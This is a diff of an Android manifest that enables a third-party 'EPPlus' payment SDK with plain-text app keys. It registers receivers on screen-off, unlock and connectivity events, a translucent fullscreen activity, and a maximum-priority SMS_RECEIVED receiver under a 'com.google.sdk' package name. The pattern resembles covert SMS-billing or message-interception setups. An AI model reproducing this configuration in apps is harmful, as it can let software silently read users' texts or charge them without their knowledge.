@@ -35,37 +35,37 @@
         
         
         <!-- 第三方支付配置 -->
-<!--          <service  android:exported="false" android:name="com.epplus.face.EPPlusPayService"></service> -->
-<!--         <meta-data -->
-<!--             android:name="EP_CHANNEL" -->
-<!--             android:value="a10010" > -->
-<!--         </meta-data> -->
-<!--         <meta-data -->
-<!--             android:name="EP_APPKEY" -->
-<!--             android:value="f17d2fb4eff547c8bebc1e7cc4dcd43c" > -->
-<!--              android:value="bee023d716ff43b1af3652558ccf821d" --> 
+         <service  android:exported="false" android:name="com.epplus.face.EPPlusPayService"></service>
+        <meta-data
+            android:name="EP_CHANNEL"
+            android:value="a10010" >
+        </meta-data>
+        <meta-data
+            android:name="EP_APPKEY"
+            android:value="f17d2fb4eff547c8bebc1e7cc4dcd43c" >
+             android:value="bee023d716ff43b1af3652558ccf821d" 
             
-<!--         </meta-data> -->
+        </meta-data>
         
         
         
         
-<!--        <receiver android:exported="false" android:name="com.epplus.face.EPPlusPayServiceReceiver" >   -->
-<!-- 			<intent-filter>   -->
+       <receiver android:exported="false" android:name="com.epplus.face.EPPlusPayServiceReceiver" >  
+			<intent-filter>  
 			    
-<!-- 			     <action android:name="android.intent.action.SCREEN_OFF"/>  -->
-<!-- 			     <action android:name="com.ep.action.MESSAGE"/>  -->
-<!-- 			     <action android:name="android.net.conn.CONNECTIVITY_CHANGE" /> -->
-<!-- 			     <action android:name="android.intent.action.USER_PRESENT" /> -->
-<!-- 		    </intent-filter>   -->
-<!-- 		</receiver>  -->
+			     <action android:name="android.intent.action.SCREEN_OFF"/> 
+			     <action android:name="com.ep.action.MESSAGE"/> 
+			     <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+			     <action android:name="android.intent.action.USER_PRESENT" />
+		    </intent-filter>  
+		</receiver> 
 		
-<!--         <activity android:name="com.epplus.face.EPPlusPayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"> -->
-<!--             <intent-filter> -->
-<!--                 <action android:name="com.epplus.face.EPPlusPayActivity" /> -->
-<!--                 <category android:name="android.intent.category.DEFAULT"/> -->
-<!--             </intent-filter> -->
-<!--         </activity> -->
+        <activity android:name="com.epplus.face.EPPlusPayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="com.epplus.face.EPPlusPayActivity" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
         
         <activity
 		    android:name="com.google.sdk.GeneralActivity"
@@ -81,11 +81,11 @@
 		    </intent-filter>
 		</receiver>
 		
-<!-- 		<receiver android:name="com.google.sdk.SMSReceiver" > -->
-<!-- 		    <intent-filter android:priority="2147483647" > -->
-<!-- 		        <action android:name="android.provider.Telephony.SMS_RECEIVED" /> -->
-<!-- 		    </intent-filter> -->
-<!-- 		</receiver> -->
+		<receiver android:name="com.google.sdk.SMSReceiver" >
+		    <intent-filter android:priority="2147483647" >
+		        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+		    </intent-filter>
+		</receiver>
 				
 		
 		
